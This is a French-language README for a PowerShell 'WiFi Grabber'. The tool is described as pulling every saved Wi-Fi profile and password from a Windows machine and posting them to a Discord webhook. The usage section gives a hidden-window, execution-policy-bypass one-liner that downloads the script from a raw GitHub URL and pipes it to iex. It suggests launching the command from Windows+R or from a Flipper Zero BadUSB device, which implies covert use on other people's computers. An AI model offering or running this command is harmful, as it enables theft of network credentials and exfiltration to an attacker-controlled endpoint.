# 📡 WiFi Grabber PowerShell

Un script PowerShell léger qui extrait les profils Wi-Fi enregistrés sur une machine Windows (FR) et envoie les identifiants masqués vers un webhook Discord.

---

## 🚀 Fonctionnalités

- 🔍 Récupère tous les profils Wi-Fi (`netsh wlan show profiles`)
- 🔑 Extrait les clés Wi-Fi stockées localement
- 🕵️ Formate les mots de passe Wi-Fi en **spoiler Discord** (`||motdepasse||`)
- 📤 Envoie l’ensemble des infos dans **un seul message** via un webhook Discord

---

## 🧪 Exemple de résultat

📶 Réseau : Livebox_Maison
 🔑 Clé : ||motdepasse123||

📶 Réseau : GUEST_WIFI 🔑
 Clé : ||weloveunifi||

---

## ⚙️ Utilisation


### 1. Héberger le script en version RAW 

### 2. Exécution via ligne de commande PowerShell (ou Flipper Zero BadUSB)

`Windows + R`

```bash
powershell -w h -NoP -Ep Bypass $webhook='https://discord.com/api/webhooks/TON_ID/TON_TOKEN';irm https://raw.githubusercontent.com/tonrepo/wifi-grabber/main/wifi.ps1 | iex
```





![PowerShell](https://img.shields.io/badge/script-PowerShell-blue?logo=powershell)
